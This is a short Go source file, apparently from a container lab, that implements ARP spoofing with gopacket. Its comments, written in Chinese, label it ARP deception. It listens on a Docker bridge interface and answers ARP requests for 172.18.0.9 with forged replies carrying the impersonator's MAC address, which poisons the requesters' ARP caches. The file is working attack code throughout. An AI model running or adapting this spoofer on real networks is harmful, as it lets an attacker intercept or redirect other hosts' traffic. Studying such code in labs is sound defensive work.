package arp

import (
	"fmt"
	"log"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/mdlayher/arp"
)

// arp欺骗
func GoReply() {
	// 网卡名称要根据容器实际用到的网卡名称ip addr查看
	handle, err := pcap.OpenLive("br-08d723f5a04b", 1600, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	// Set filter
	var filter = "arp"
	if err := handle.SetBPFFilter(filter); err != nil {
		log.Fatal(err)
	}
	fmt.Println("GoReply开始监听arp")
	// Use the handle as a packet source to process all packets
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		arpLayer := packet.Layer(layers.LayerTypeARP)
		if arpLayer != nil {
			arps, _ := arpLayer.(*layers.ARP)
			if arps.Operation == uint16(arp.OperationRequest) {
				fmt.Println("收到arp请求")
				if net.IP(arps.DstProtAddress).String() == "172.18.0.9" {
					// ARP 响应
					go sendARPReply(handle, arps)
				}
			}

		}
	}
}

func sendARPReply(handle *pcap.Handle, request *layers.ARP) {
	// 查看伪装者的实际mac地址
	// 02:42:ac:11:00:07
	// 当外者广播要知道172.18.0.9的mac地址是多少时，将172.18.0.4的mac地址告诉外者
	ethernet := &layers.Ethernet{
		SrcMAC:       net.HardwareAddr{0x02, 0x42, 0xac, 0x11, 0x00, 0x07}, // Your MAC address
		DstMAC:       request.SourceHwAddress,
		EthernetType: layers.EthernetTypeARP,
	}
	arps := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   ethernet.SrcMAC,
		SourceProtAddress: request.DstProtAddress,
		DstHwAddress:      request.SourceHwAddress,
		DstProtAddress:    request.SourceProtAddress,
	}

	// Create a buffer and serialize the packet into the buffer
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	gopacket.SerializeLayers(buf, opts, ethernet, arps)

	// Send the packet
	err := handle.WritePacketData(buf.Bytes())
	if err != nil {
		log.Fatal(err)
	}

	log.Printf("ARP Reply sent to %v", net.IP(request.SourceProtAddress))
	time.Sleep(1 * time.Second)
}
